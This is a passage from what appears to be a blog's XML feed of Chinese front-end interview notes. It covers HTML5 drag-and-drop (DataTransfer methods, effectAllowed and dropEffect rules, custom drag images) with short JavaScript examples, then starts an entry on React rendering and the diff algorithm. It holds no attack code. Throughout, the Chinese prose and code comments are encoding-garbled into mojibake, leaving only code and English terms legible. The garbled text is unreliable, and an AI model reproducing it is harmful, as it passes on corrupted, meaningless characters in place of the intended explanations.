æ‹–æ”¾æ“ä½œç»“æŸ 1234567891011121314151617181920212223242526272829303132333435&lt;body onload="init()"&gt; &lt;h2&gt;ç®€å•æ‹–æ”¾ç¤ºä¾‹&lt;/h2&gt; &lt;div id="dragme" draggable="true" style="width:200px;border:1px solid gray"&gt; è¯·æ‹–æ”¾ &lt;/div&gt; &lt;div id="text" style="width:200px;height:200px;border:1px solid gray"&gt;&lt;/div&gt; &lt;script&gt; function init() &#123; const source = document.getElementById('dragme'); const dest = document.getElementById('text'); source.addEventListener('dragstart', function (ev) &#123; const dt = ev.dataTransfer; dt.effectAllowed = 'all'; dt.setData('text/plain', 'ä½ å¥½') &#125;, false); dest.addEventListener('dragend', function (ev) &#123; // ä¸æ‰§è¡Œé»˜è®¤å¤„ç†ï¼ˆæ‹’ç»è¢«æ‹–æ”¾ï¼‰ ev.preventDefault(); &#125;); dest.addEventListener('drop', function (ev) &#123; const dt = ev.dataTransfer; const text = dt.getData('text/plain'); dest.textContent += text; ev.preventDefault(); // ç¦æ­¢äº‹ä»¶ä¼ æ’­ ev.stopPropagation(); &#125;, false) &#125; // é¡µé¢è®¾ç½®å±žæ€§ï¼Œä¸æ‰§è¡Œé»˜è®¤å¤„ç†(æ‹’ç»è¢«æ‹–æ”¾) document.ondragover = function (e) &#123; e.preventDefault() &#125; document.ondrop = function (e) &#123; e.preventDefault() &#125; &lt;/script&gt;&lt;/body&gt; å¼€å§‹æ‹–åŠ¨ï¼ˆdragstartäº‹ä»¶å‘ç”Ÿï¼‰æ—¶ï¼Œå°†è¦æ‹–åŠ¨çš„æ•°æ®å­˜å…¥ DataTransferå¯¹è±¡ï¼ˆsetData()æ–¹æ³•ï¼‰ã€‚DataTransferå¯¹è±¡ä¸“é—¨ç”¨æ¥å­˜æ”¾æ‹–æ”¾æ—¶è¦æºå¸¦çš„æ•°æ®ï¼Œå®ƒå¯ä»¥è¢«è®¾ç½®ä¸ºæ‹–åŠ¨äº‹ä»¶å¯¹è±¡çš„ dataTransferå±žæ€§ã€‚setDataæ–¹æ³•ä¸­çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæºå¸¦æ•°æ®çš„æ•°æ®ç§ç±»çš„å­—ç¬¦ä¸²ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºè¦ä¿®æ”¹çš„æ•°æ®ã€‚ç¬¬ä¸€ä¸ªå‚æ•°ä¸­è¡¨ç¤ºæ•°æ®ç§ç±»çš„å­—ç¬¦ä¸²é‡Œåªèƒ½å¡«å…¥ç±»ä¼¼ text/plainæˆ–è€…text/htmlçš„è¡¨ç¤º MIME ç±»åž‹çš„æ–‡å­—ï¼Œä¸èƒ½å¡«å…¥å…¶ä»–æ–‡å­—ã€‚ å¦‚æžœæŠŠdt.setData(&quot;text/plain&quot;,&quot;ä½ å¥½&quot;)æ”¹æˆ dt.setData(&quot;text/plain&quot;,this.id)ã€‚å› ä¸ºæŠŠè¢«æ‹–åŠ¨å…ƒç´ çš„ id å½“æˆäº†å‚æ•°ï¼Œæ‰€ä»¥æºå¸¦çš„æ•°æ®å°±æ˜¯è¢«æ‹–åŠ¨å…ƒç´ ä¸­çš„æ•°æ®äº†ï¼Œå› ä¸ºæµè§ˆå™¨åœ¨ä½¿ç”¨ getData()æ–¹æ³•è¯»å–æ•°æ®æ—¶ä¼šè‡ªåŠ¨è¯»å–è¯¥å…ƒç´ ä¸­çš„æ•°æ®ã€‚ é’ˆå¯¹æ‹–æ”¾çš„ç›®æ ‡å…ƒç´ ï¼Œå¿…é¡»åœ¨ dragendæˆ–è€… dragoveräº‹ä»¶å†…è°ƒç”¨äº‹ä»¶å¯¹è±¡çš„ preventDefault()æ–¹æ³•ã€‚å› ä¸ºé»˜è®¤æƒ…å†µä¸‹ï¼Œè¢«æ‹–æ”¾çš„ç›®æ ‡å…ƒç´ ä¸å…è®¸æŽ¥å—å…ƒç´ çš„ï¼Œä¸ºäº†æŠŠå…ƒç´ æ‹–æ”¾åˆ°å…¶ä¸­ï¼Œå¿…é¡»æŠŠé»˜è®¤å¤„ç†ç»™å…³é—­æŽ‰ã€‚ ç›®æ ‡å…ƒç´ æŽ¥å—åˆ°è¢«æ‹–æ”¾çš„å…ƒç´ åŽï¼Œæ‰§è¡Œ getDataæ–¹æ³•ä»Ž DataTransferèŽ·å¾—æ•°æ®ã€‚getDataæ–¹æ³•çš„å‚æ•°ä¸º setDataæ–¹æ³•ä¸­æŒ‡å®šçš„æ•°æ®ç§ç±» è¦å®žçŽ°æ‹–æ”¾è¿‡ç¨‹ï¼Œè¿˜å¿…é¡»åœ¨ç›®æ ‡å…ƒç´ çš„ dropäº‹ä»¶ä¸­å…³é—­é»˜è®¤å¤„ç†ï¼ˆæ‹’ç»è¢«æ‹–æ”¾ï¼‰ï¼Œå¦åˆ™ç›®æ ‡å…ƒç´ ä¸èƒ½æŽ¥å—è¢«æ‹–æ”¾çš„å…ƒç´  å®žçŽ°æ‹–æ”¾è¿‡ç¨‹ï¼Œè¿˜å¿…é¡»è®¾å®šæ•´ä¸ªé¡µé¢ä¸ºä¸æ‰§è¡Œé»˜è®¤å¤„ç†ï¼ˆæ‹’ç»è¢«æ‹–æ”¾ï¼‰ï¼Œå¦åˆ™æ‹–æ”¾å¤„ç†ä¹Ÿä¸èƒ½è¢«å®žçŽ°ã€‚å› ä¸ºé¡µé¢æ˜¯å…ˆäºŽå…¶ä»–å…ƒç´ æŽ¥å—æ‹–æ”¾çš„ï¼Œå¦‚æžœé¡µé¢ä¸Šæ‹’ç»æ‹–æ”¾ï¼Œé‚£ä¹ˆé¡µé¢ä¸Šå…¶ä»–å…ƒç´ å°±éƒ½ä¸èƒ½æŽ¥å—æ‹–æ”¾ è¦ä½¿å…ƒç´ å¯ä»¥è¢«æ‹–æ”¾ï¼Œé¦–å…ˆå¿…é¡»æŠŠè¯¥å…ƒç´ çš„ draggableå±žæ€§è®¾ä¸º trueï¼Œå¦å¤–ï¼Œä¸ºäº†è®©è¿™ä¸ªç¤ºä¾‹åœ¨æ‰€æœ‰æ”¯æŒæ‹–æ”¾ API çš„æµè§ˆå™¨ä¸­éƒ½èƒ½æ­£å¸¸è¿è¡Œï¼Œéœ€è¦æŒ‡å®š -webkit-user-drag:elementè¿™ç§ Webkit ç‰¹æœ‰çš„ CSS å±žæ€§ çŽ°åœ¨æ”¯æŒæ‹–æ”¾å¤„ç†çš„ MIME ç±»åž‹ä¸»è¦æœ‰ä¸€ä¸‹å‡ ç§ï¼š text/plain:æ–‡æœ¬æ–‡å­— text/htmlï¼šHTMLæ–‡å­— text/xmlï¼šxml æ–‡å­— text/uri-listï¼šURL åˆ—è¡¨ï¼Œæ¯ä¸ª URL ä¸ºä¸€è¡Œ DataTransfer å¯¹è±¡çš„å±žæ€§ä¸Žæ–¹æ³• å±žæ€§/æ–¹æ³• æè¿° dropEffectå±žæ€§ è¡¨ç¤ºæ‹–æ”¾æ“ä½œçš„è§†è§‰æ•ˆæžœï¼Œè¿è¡Œå¯¹å…¶è¿›è¡Œå€¼çš„è®¾å®šã€‚è¯¥æ•ˆæžœå¿…é¡»ç”¨ effectAllowedå±žæ€§ç½®é¡¶çš„å…è®¸çš„æ•ˆæžœèŒƒå›´å†…ã€‚å…è®¸æŒ‡å®šçš„å€¼ä¸º noneã€copyã€moveã€link effectAllowedå±žæ€§ ç”¨æ¥æŒ‡å®šå½“å…ƒç´ è¢«æ‹–æ”¾æ—¶æ‰€è¿è¡Œçš„è§†è§‰æ•ˆæžœï¼Œå¯ä»¥æŒ‡å®šçš„å€¼ä¸ºnoneã€copyã€copyLinkã€copyMoveã€linkã€linkMoveã€moveã€allã€unintialize typeså±žæ€§ å­˜å…¥æ•°æ®çš„ç§ç±»ï¼Œå­—ç¬¦ä¸²çš„ä¼ªæ•°ç»„ void clearData(DOMString format)æ–¹æ³• æ¸…é™¤ DataTransfer å¯¹è±¡ä¸­å­˜æ”¾çš„æ•°æ®ï¼Œå¦‚æžœçœç•¥å‚æ•° format,åˆ™æ¸…é™¤å…¨éƒ¨æ•°æ® void setData(DOMString formatã€DOMString data) å‘ DataTransfer å¯¹è±¡å†…å­˜å…¥æ•°æ® DOMString getData(DOMString format) ä»Ž DataTransfer å¯¹è±¡ä¸­è¯»æ•°æ® void setDragImage(Element image,long x,long y) ç”¨ img å…ƒç´ æ¥è®¾ç½®æ‹–æ”¾å›¾æ ‡ï¼ˆéƒ¨åˆ†æµè§ˆå™¨å¯ä»¥ç”¨ canvas ç­‰å…¶ä»–å…ƒç´ æ¥è®¾ç½®ï¼‰ è®¾å®šæ‹–æ”¾æ—¶çš„è§†è§‰æ•ˆæžœdropEffectä¸Ž effectAllowedå±žæ€§ç»“åˆèµ·æ¥å¯ä»¥è®¾å®šæ‹–æ”¾æ—¶çš„è§†è§‰æ•ˆæžœã€‚effectAllowedå±žæ€§è¡¨ç¤ºå½“ä¸€ä¸ªå…ƒç´ è¢«æ‹–åŠ¨æ—¶æ‰€è¿è¡Œçš„è§†è§‰æ•ˆæžœï¼Œä¸€èˆ¬åœ¨ ondragstartäº‹ä»¶ä¸­è®¾å®šï¼Œè¿è¡Œä½¿ç”¨çš„å€¼ä¸º noneã€copyã€copyLinkã€copyMoveã€linkã€moveã€allã€unintializeã€‚ dropEffectå±žæ€§è¡¨ç¤ºå®žé™…æ‹–æ”¾æ—¶çš„è§†è§‰æ•ˆæžœï¼Œä¸€èˆ¬åœ¨ ondragoveräº‹ä»¶ä¸­æŒ‡å®šï¼Œè¿è¡Œè®¾å®šçš„å€¼ä¸º noneã€copyã€linkã€moveã€‚dropEffectå±žæ€§æ‰€è¡¨ç¤ºçš„å®žé™…è§†è§‰æ•ˆæžœå¿…é¡»åœ¨ effectAllowedå±žæ€§æ‰€è¡¨ç¤ºçš„å…è®¸çš„è§†è§‰æ•ˆæžœèŒƒå›´å†…ã€‚è§„åˆ™å¦‚ä¸‹ï¼š å¦‚æžœ effectAllowedå±žæ€§è¢«è®¾ä¸º noneï¼Œåˆ™ä¸å…è®¸æ‹–æ”¾å…ƒç´ ã€‚ å¦‚æžœ dropEffectå±žæ€§è®¾å®šä¸º noneï¼Œåˆ™ä¸å…è®¸è¢«æ‹–æ”¾åˆ°ç›®æ ‡å…ƒç´ ä¸­ effectAllowedå±žæ€§è®¾å®šä¸º allæˆ–è€…ä¸è®¾å®šï¼Œåˆ™ dropEffectå±žæ€§å…è®¸è¢«è®¾å®šä¸ºä»»ä½•å€¼ï¼Œå¹¶æŒ‰ç…§æŒ‡å®šçš„è§†è§‰æ•ˆæžœè¿›è¡Œæ˜¾ç¤º å¦‚æžœ effectAllowedå±žæ€§è®¾å®šä¸ºå…·ä½“æ•ˆæžœï¼ˆä¸ä¸º noneæˆ–è€… allï¼‰ï¼ŒdropEffectå±žæ€§ä¹Ÿè®¾å®šäº†å…·ä½“è§†è§‰æ•ˆæžœï¼Œåˆ™ä¸¤ä¸ªå…·ä½“æ•ˆæžœå€¼å¿…é¡»å®Œå…¨ç›¸ç­‰ï¼Œå¦åˆ™ä¸å…è®¸è¢«æ‹–æ”¾å…ƒç´ æ‹–æ”¾åˆ°ç›®æ ‡å…ƒç´ ä¸­ã€‚ 1234567891011source.addEventListener('dragstart',function(ev)&#123; const dt = ev.dataTransfer; dt.effectAllowed = 'copy'; dt.setData("text/plain","ä½ å¥½")&#125;,false);dest.addEventListener('dragover',function(ev)&#123; const dt = ev.dataTransfer; dt.dropEffect = 'copy'; ev.preventDefault();&#125;,false); è‡ªå®šä¹‰æ‹–æ”¾å›¾æ ‡é™¤äº†ä¸Šé¢æ‰€è¯´çš„ä½¿ç”¨ effectAllowedå±žæ€§ä¸ŽdropEffectå±žæ€§å¤–ï¼ŒHTML5 è¿˜å…è®¸è‡ªå®šä¹‰æ‹–æ”¾å›¾æ ‡â€”â€”æŒ‡çš„æ˜¯åœ¨ç”¨é¼ æ ‡æ‹–åŠ¨å…ƒç´ çš„è¿‡ç¨‹ä¸­ï¼Œä½äºŽé¼ æ ‡æŒ‡é’ˆä¸‹éƒ¨çš„å°å›¾æ ‡ã€‚ setDragImageæ–¹æ³•æœ‰ä¸‰ä¸ªæƒ¨å‘¼ï¼Œç¬¬ä¸€ä¸ªå‚æ•° image è®¾å®šä¸ºæ‹–æ”¾å›¾æ ‡çš„å›¾æ ‡å…ƒç´ ï¼Œç¬¬äºŒä¸ªå‚æ•° x ä¸ºæ‹–æ”¾å›¾æ ‡ç¦»é¼ æ ‡æŒ‡é’ˆxè½´æ–¹å‘çš„ä½ç§»é‡ï¼Œç¬¬ä¸‰ä¸ªå‚æ•° y ä¸ºæ‹–æ”¾å›¾æ ‡è·ç¦»é¼ æ ‡æŒ‡é’ˆçš„ y è½´æ–¹å‘çš„ä½ç§»é‡ã€‚ 123456789dragIcon.src = 'http://laibh.top/images/favicon-32x32-next.png?v=5.1.4';source.addEventListener('dragstart', function (ev) &#123;const dt = ev.dataTransfer;console.log(ev)console.log(dt)dt.effectAllowed = 'all';dt.setDragImage(dragIcon, -10, -10)dt.setData('text/plain', 'ä½ å¥½')&#125;, false);]]></content>
      <categories>
        <category>å‰ç«¯é¢è¯•</category>
      </categories>
      <tags>
        <tag>HTML5</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å‰ç«¯é¢è¯•é¢˜ç›®æ±‡æ€»æ‘˜å½•ï¼ˆReact åŸºç¡€ç¯‡ï¼‰]]></title>
    <url>%2F%E5%89%8D%E7%AB%AF%E9%9D%A2%E8%AF%95%E9%A2%98%E7%9B%AE%E6%B1%87%E6%80%BB%E6%91%98%E5%BD%95-React%20%E5%9F%BA%E7%A1%80%E7%AF%87.html</url>
    <content type="text"><![CDATA[æ¸©æ•…è€ŒçŸ¥æ–°ï¼Œä¿æŒç©ºæ¯å¿ƒæ€ React åŸºç¡€ä»€ä¹ˆæ˜¯ React?æ˜¯ä¸€ä¸ªç”¨äºŽæž„å»ºç”¨æˆ·ç•Œé¢çš„ javaScript åº“ï¼Œä¸»è¦ç”¨äºŽæž„å»º UI,å¾ˆå¤šäººè®¤ä¸ºæ˜¯ MVC ä¸­çš„ View å±‚ ç‰¹ç‚¹ï¼š å£°æ˜Žå¼è®¾è®¡ â€“ é‡‡ç”¨å£°æ˜ŽèŒƒå¼ï¼Œå¯ä»¥è½»æ¾æè¿°åº”ç”¨ é«˜æ•ˆ â€“ é€šè¿‡å¯¹ DOM çš„æ¨¡æ‹Ÿï¼Œæœ€å¤§é™åº¦åœ°å‡å°‘ä¸Ž DOM çš„äº¤äº’ çµæ´» â€“ React å¯ä»¥ä¸Žå¾ˆå¤šåº“æˆ–è€…æ¡†æž¶å¾ˆå¥½åœ°é…åˆ JSX â€“ JSX æ˜¯ javascript è¯­æ³•çš„æ‰©å±• ç»„ä»¶ â€“ é€šè¿‡ React æž„å»ºçš„ç»„ä»¶ï¼Œä½¿å¾—ä»£ç æ›´åŠ å®¹æ˜“å¾—åˆ°ï¼Œå¾ˆå¥½çš„åº”ç”¨åœ¨å¤§é¡¹ç›®çš„å¼€å‘ä¸­ å•å‘å“åº”çš„æ•°æ®æµ â€“ å‡å°‘äº†é‡å¤ä»£ç  Reactçš„æ¸²æŸ“æœºåˆ¶React æ¸²æŸ“è¿‡ç¨‹é¡µé¢æ‰“å¼€çš„æ—¶å€™ï¼ŒReact ä¼šè°ƒç”¨ render å‡½æ•°æ¥æž„å»ºä¸€é¢— DOM æ ‘ï¼Œåœ¨ state/propsæ”¹å˜çš„æ—¶å€™ï¼Œ render å‡½æ•°ä¼šå†æ¬¡è°ƒç”¨æ¸²æŸ“å‡ºæ¥å¦å¤–ä¸€é¢—æ ‘ï¼ŒæŽ¥ç€ï¼Œ React ä¼šå¯¹ä¸¤æ£µæ ‘è¿›è¡Œå¯¹æ¯”ï¼Œæ‰¾å‡ºéœ€è¦æ›´æ–°çš„åœ°æ–¹è¿›è¡Œæ‰¹é‡æ”¹åŠ¨ Diff ç®—æ³•ä½œç”¨ è®¡ç®—å‡º Virtual DOM ä¸­çœŸæ­£å˜åŒ–çš„éƒ¨åˆ†ï¼Œå¹¶åªé’ˆå¯¹è¯¥éƒ¨åˆ†è¿›è¡ŒåŽŸç”Ÿ DOM æ“ä½œï¼Œè€Œéžé‡æ–°æ¸²æŸ“æ•´ä¸ªé¡µé¢ã€‚ ä¼ ç»Ÿ diff ç®—æ³•çš„åŠ£å¤„ é€šè¿‡å¾ªçŽ¯é€’å½’èŠ‚ç‚¹è¿›è¡Œä¾æ¬¡å¯¹æ¯”ï¼Œç®—æ³•å¤æ‚åº¦è¾¾åˆ° O(n^3)ï¼Œn æ˜¯æ ‘çš„èŠ‚ç‚¹æ•°ã€‚å‡è®¾å±•ç¤º1000ä¸ªèŠ‚ç‚¹ï¼Œå¾—æ‰§è¡Œä¸Šäº¿æ¬¡æ¯”è¾ƒã€‚CPU æ— æ³•è¿›è¡Œåœ¨å¾ˆçŸ­çš„æ—¶é—´å†…è®¡ç®—å‡ºå·®å¼‚ React çš„ diff ç®—æ³• å°† Virtual DOM æ ‘è½¬æ¢æˆä¸º Actual DOM æ ‘çš„æœ€å°‘æ“ä½œè¿‡ç¨‹è¢«ç§°ä¸ºè°ƒå’Œã€‚React çš„ diff ç®—æ³•å°±æ˜¯è°ƒå’Œçš„å…·ä½“å®žçŽ°ã€‚ React çš„diff ç­–ç•¥ React ç”¨ä¸‰å¤§ç­–ç•¥å°† O(n^3)å¤æ‚éƒ½è½¬æ¢ä¸º O(n)å¤æ‚åº¦ ç­–ç•¥1ï¼ˆtree diffï¼‰: Web UI ä¸­ DOM èŠ‚ç‚¹è·¨å±‚çº§çš„ç§»åŠ¨æ“ä½œç‰¹åˆ«å°‘ï¼Œå¯ä»¥å¿½ç•¥ä¸è®¡ ç­–ç•¥2ï¼ˆcomponent diffï¼‰: æ‹¥æœ‰ç›¸åŒç±»çš„ä¸¤ä¸ªç»„ä»¶ç”Ÿæˆç›¸ä¼¼çš„æ ‘å½¢ç»“æž„ æ‹¥æœ‰ä¸åŒç±»çš„ä¸¤ä¸ªç»„ä»¶ç”Ÿæˆä¸åŒçš„æ ‘å½¢ç»“æž„ ç­–ç•¥ä¸‰ï¼ˆelement diffï¼‰: å¯¹äºŽåŒä¸€å±‚çº§çš„ä¸€ç»„å­èŠ‚ç‚¹ï¼Œé€šè¿‡å”¯ä¸€çš„ id åŒºåˆ† diff ç­–ç•¥è¯¦è§£ Tree diff React é€šè¿‡ updateDepth å¯¹ Virtual DOM æ ‘è¿›è¡Œå±‚çº§æŽ§åˆ¶ å¯¹æ ‘åˆ†å±‚æ¯”è¾ƒï¼Œä¸¤æ£µæ ‘åªå¯¹åŒä¸€å±‚æ¬¡èŠ‚ç‚¹è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æžœè¯¥èŠ‚ç‚¹ä¸å­˜åœ¨æ—¶ï¼Œåˆ™è¯¥èŠ‚ç‚¹ä»¥åŠå…¶èŠ‚ç‚¹ä¼šè¢«å®Œå…¨åˆ é™¤ï¼Œä¸ä¼šå†è¿›è¡Œè¿›ä¸€æ­¥æ¯”è¾ƒ åªè¦éåŽ†ä¸€æ¬¡ï¼Œå°±èƒ½å®Œæˆæ•´é¢— DOM çš„æ¯”è¾ƒ å¦‚æžœ DOM å‡ºçŽ°äº†è·¨å±‚æ“ä½œï¼Œdiff åªä¼šç®€å•è€ƒè™‘åŒå±‚çº§çš„èŠ‚ç‚¹ä½ç½®å˜åŒ–ï¼Œå¦‚æžœæ˜¯è·¨å±‚çš„è¯ï¼Œåªæœ‰åˆ›å»ºå’Œåˆ é™¤èŠ‚ç‚¹çš„æ“ä½œã€‚å› æ­¤ä¹Ÿä¸å»ºè®®è¿›è¡Œè·¨ DOM æ“ä½œï¼Œå¯ä»¥é€šè¿‡ CSS éšè—ã€æ˜¾ç¤ºèŠ‚ç‚¹ï¼Œè€Œä¸æ˜¯çœŸæ­£åœ°ç§»é™¤ï¼Œæ·»åŠ  DOM èŠ‚ç‚¹ 12345678910111213141516updateChildren:function(nextNestedChildrenElements,transaction,context)&#123; updateDepth++; var errorThrow = true; try&#123; this._updateChildren(nextNestedChildrenElements,transaction,context) &#125;finally&#123; updateDepth--; if(updateDepth)&#123; if(errorThrow)&#123; clearQueue(); &#125;else&#123; processQueue(); &#125; &#125; &#125;&#125; Component diff åŒä¸€ç±»åž‹çš„ä¸¤ä¸ªç»„ä»¶ï¼ŒæŒ‰åŽŸç­–ç•¥ï¼ˆå±‚çº§æ¯”è¾ƒï¼‰ç»§ç»­æ¯”è¾ƒ Virtual DOM æ ‘å³å¯ åŒä¸€ç±»åž‹çš„ä¸¤ä¸ªç»„ä»¶ï¼Œç»„ä»¶ A å˜åŒ–ä¸º ç»„ä»¶ Bæ—¶ï¼Œå¯èƒ½ Virtual DOM æ²¡æœ‰ä»»ä½•æ”¹å˜ï¼Œå¦‚æžœçŸ¥é“è¿™ä¸€ç‚¹ï¼Œå¯èŠ‚çœå¤§é‡è®¡ç®—æ—¶é—´ã€‚ç”¨æˆ·å¯ä»¥é€šè¿‡ shouldComponentUpdate() æ¥åˆ¤æ–­æ˜¯å¦éœ€è¦åˆ¤æ–­è®¡ç®— ä¸åŒç±»åž‹çš„ç»„ä»¶ï¼Œå°†ä¸€ä¸ªï¼ˆå°†è¢«æ”¹å˜çš„ï¼‰ç»„ä»¶åˆ¤æ–­ä¸º dirty component(è„ç»„ä»¶)ï¼Œä»Žè€Œæ›¿æ¢æ•´ä¸ªç»„ä»¶çš„æ‰€æœ‰èŠ‚ç‚¹ã€‚ æ³¨æ„ï¼šå¦‚æžœç»„ä»¶ A å’Œ ç»„ä»¶ B çš„ç»“æž„ç›¸ä¼¼ï¼Œä½†æ˜¯ React åˆ¤æ–­æ˜¯ä¸åŒç±»åž‹çš„ç»„ä»¶ï¼Œåˆ™ä¸ä¼šæ¯”è¾ƒå…¶ç»“æž„ï¼Œè€Œæ˜¯åˆ é™¤ ç»„ä»¶ A ä»¥åŠå…¶å­èŠ‚ç‚¹ï¼Œåˆ›å»ºç»„ä»¶ B ä»¥å…¶å­èŠ‚ç‚¹ã€‚ Element diff å½“èŠ‚ç‚¹å¤„äºŽåŒä¸€å±‚çº§æ—¶ï¼Œdiff æä¾›ä¸‰ä¸ªèŠ‚ç‚¹æ“ä½œï¼šåˆ é™¤ã€æ’å…¥ã€ç§»åŠ¨ æ’å…¥ï¼šç»„ä»¶ C ä¸åœ¨é›†åˆ ï¼ˆABï¼‰ä¸­,éœ€è¦æ’å…¥ åˆ é™¤ï¼šç»„ä»¶ D åœ¨é›†åˆ ï¼ˆABDï¼‰ä¸­ï¼Œä½†æ˜¯é›†åˆå˜æˆï¼ˆABï¼‰,Då°±éœ€è¦è¢«åˆ é™¤ ç§»åŠ¨ï¼šç»„ä»¶ D å·²ç»åœ¨é›†åˆï¼ˆABCDï¼‰ä¸­ï¼Œä¸”é›†åˆæ›´æ–°æ—¶ï¼ŒD æ²¡æœ‰å‘ç”Ÿæ›´æ–°ï¼Œåªæ˜¯ä½ç½®çš„æ”¹å˜ï¼Œå¦‚æ–°çš„é›†åˆï¼ˆADBCï¼‰ã€‚D åœ¨ç¬¬äºŒä¸ªï¼Œæ— é¡»åƒä¼ ç»Ÿçš„ diff,è®©æ—§é›†åˆçš„ç¬¬äºŒä¸ª B å’Œæ–°é›†åˆçš„æ¯”è¾ƒï¼Œå¹¶ä¸”åˆ é™¤ç¬¬äºŒä¸ªä½ç½®çš„ Bï¼Œå†åœ¨ç¬¬äºŒä¸ªä½ç½®æ’å…¥ D ã€‚éœ€è¦åšçš„æ˜¯ï¼ˆå¯¹åŒä¸€å±‚çº§çš„åŒç»„å­èŠ‚ç‚¹ï¼‰æ·»åŠ å”¯ä¸€çš„ key è¿›è¡ŒåŒºåˆ†ï¼Œç§»åŠ¨å³å¯ã€‚ ç§»åŠ¨é€»è¾‘è¯¦è§£ æƒ…å½¢ä¸€ï¼šæ–°æ—§é›†åˆä¸­å­˜åœ¨ç›¸åŒèŠ‚ç‚¹ä½†æ˜¯ä½ç½®ä¸åŒæ—¶ï¼Œå¦‚ä½•ç§»åŠ¨èŠ‚ç‚¹ lastIndexæœ‰ç‚¹åƒæµ®æ ‡ï¼Œæˆ–è€…ä¸€ä¸ª map çš„ç´¢å¼•ï¼Œé»˜è®¤å€¼æ˜¯ 0ï¼Œä¼šä¸Ž map ä¸­çš„å…ƒç´ è¿›è¡Œæ¯”è¾ƒåŽæ”¹å˜è‡ªå·±çš„å€¼ï¼ˆå– indexå’Œ lastIndexä¸­çš„è¾ƒå¤§å€¼ï¼‰ Bï¼ŒReact åœ¨æ–°ä¸­å–å¾— ,åˆ¤æ–­æ—§ä¸­æ˜¯å¦å­˜åœ¨ç›¸åŒçš„èŠ‚ç‚¹B,å‘çŽ°èŠ‚ç‚¹BåŽåˆ¤æ–­æ˜¯å¦éœ€è¦ç§»åŠ¨Bã€‚ B åœ¨æ—§ä¸­ index = 1,å®ƒ çš„ lastIndex = 0 ä¸æ»¡è¶³ lastIndex &gt; indexï¼Œæ— éœ€ç§»åŠ¨æ“ä½œã€‚ lastindex = Math.max(lastindex,index) = 1 Aï¼ŒAåœ¨æ—§çš„ index=0,æ­¤æ—¶ lastIndex=1ã€‚æ»¡è¶³ lastIndex &gt; indexï¼Œå¯¹ A è¿›è¡Œç§»åŠ¨åˆ° lastIndex=1ã€‚æŽ¥ç€æ“ä½œ lastIndex=Math.max(lastIndex,index)è¿˜æ˜¯ç­‰äºŽ1 Dï¼ŒåŒ 1ï¼Œä¸ç§»åŠ¨ï¼Œç”±äºŽæ—§çš„D index=3,lastIndex=1ï¼Œæ”¹ lastIndex=Math.max(lastIndex,index)=3 C,åŒ 2ï¼Œç§»åŠ¨ã€‚Cåœ¨æ—§çš„ index=2,æ»¡è¶³lastIndex(3)&gt;indexï¼Œç§»åŠ¨ ç”±äºŽ C å·²ç»æ˜¯æœ€åŽä¸€ä¸ªèŠ‚ç‚¹äº†ï¼Œæ‰€ä»¥ diff æ“ä½œç»“æŸ æƒ…å½¢äºŒï¼šæ–°é›†åˆä¸­æœ‰æ–°åŠ å…¥çš„èŠ‚ç‚¹ï¼Œæ—§é›†åˆä¸­æœ‰åˆ é™¤çš„èŠ‚ç‚¹ B,åŒä¸Šç†ï¼Œä¸ç§»åŠ¨ï¼Œæ›´æ–° lastIndex=1 E,æ—§é›†åˆä¸­æ²¡æœ‰ï¼Œåœ¨ lastIndex=1ä¸Šåˆ›å»ºEï¼Œæ›´æ–° lastIndex=1 Cï¼ŒCåœ¨æ—§é›†åˆä¸­ index=2,ä¸æ»¡è¶³lastIndex&gt;indexï¼Œä¸ç§»åŠ¨ï¼Œæ›´æ–° lastIndex=Math.max(lastIndex,index)=2 Aï¼Œæ—§é›†åˆä¸­ index=0ï¼Œç¬¦åˆ lastIndex&gt;indexï¼Œç§»åŠ¨ï¼ŒlastIndexè¿˜æ˜¯ç­‰äºŽ 2 æ–°æ—§é›†åˆå¯¹æ¯”åŽï¼Œå†å¯¹æ—§é›†åˆéåŽ†ã€‚åˆ¤æ–­æ–°é›†åˆä¸­æ²¡æœ‰ï¼Œä½†æ˜¯æ—§é›†åˆæœ‰çš„å…ƒç´ Dï¼Œåˆ é™¤ Dï¼Œdiff æ“ä½œç»“æŸ diff çš„ä¸è¶³ä¹‹å¤„ä¸Žå¾…ä¼˜åŒ–çš„åœ°æ–¹ æƒ…å½¢ä¸‰ï¼šå°†æœ€åŽä¸€ä¸ªå…ƒç´ ç§»åŠ¨åˆ°æœ€å‰é¢ D,æ­¤æ—¶D ä¸ç§»åŠ¨ï¼Œä½†æ˜¯å› ä¸ºå®ƒçš„ index æœ€å¤§çš„ï¼Œå¯¼è‡´ lastIndex=3ï¼Œä»Žè€Œä½¿å¾—å…¶ä»–å…ƒç´ çš„ index &lt; lastIndexï¼Œå¯¼è‡´éƒ½è¦åŽ»ç§»åŠ¨ã€‚ ç†æƒ³çš„æƒ…å†µæ˜¯å€¼ç§»åŠ¨D,ä¸ç§»åŠ¨ ABC.å› æ­¤åœ¨å¼€å‘ä¸­ï¼Œåº”è¯¥å°½é‡å‡å°‘å°†æœ€åŽä¸€ä¸ªèŠ‚ç‚¹ç§»åŠ¨åˆ°åˆ—è¡¨çš„é¦–éƒ¨ï¼Œå½“èŠ‚ç‚¹æ•°é‡è¿‡å¤§æˆ–è€…æ“ä½œæ›´æ–°è¿‡äºŽé¢‘ç¹çš„æ—¶å€™ï¼Œä¼šå½±å“åˆ° React çš„æ¸²æŸ“æ€§èƒ½ã€‚ React JSXReact ä½¿ç”¨ JSX æ¥æ›¿ä»£å¸¸è§„çš„ javascript,æœ‰å‡ ä¸ªä¼˜ç‚¹ï¼š æ‰§è¡Œæ›´å¿«ï¼Œåœ¨ç¼–è¯‘ä¸º javascript ä»£ç åŽè¿›è¡Œäº†ä¼˜åŒ– ç±»åž‹å®‰å…¨ï¼Œåœ¨ç¼–è¯‘è¿‡ç¨‹ä¸­å°±èƒ½å‘çŽ°é”™è¯¯ ä½¿ç”¨ JSX ç¼–å†™æ¨¡æ¿ç®€å•å¿«é€Ÿ åœ¨ React åº”ç”¨ä¸­ï¼Œå…ƒç´ æ˜¯æž„æˆ React çš„æœ€å°å•ä½ï¼ŒJSX å°±æ˜¯ç”¨æ¥å£°æ˜Ž React å½“ä¸­çš„å…ƒç´ ã€‚ ä¸Žæµè§ˆå™¨çš„ DOM å…ƒç´ ä¸åŒï¼ŒReact å½“ä¸­çš„å…ƒç´ æ˜¯æ™®é€šçš„å¯¹è±¡ï¼ŒReactDOM å¯ä»¥ç¡®ä¿æµè§ˆå™¨çš„æ•°æ®å†…å®¹ä¸Ž React å…ƒç´ 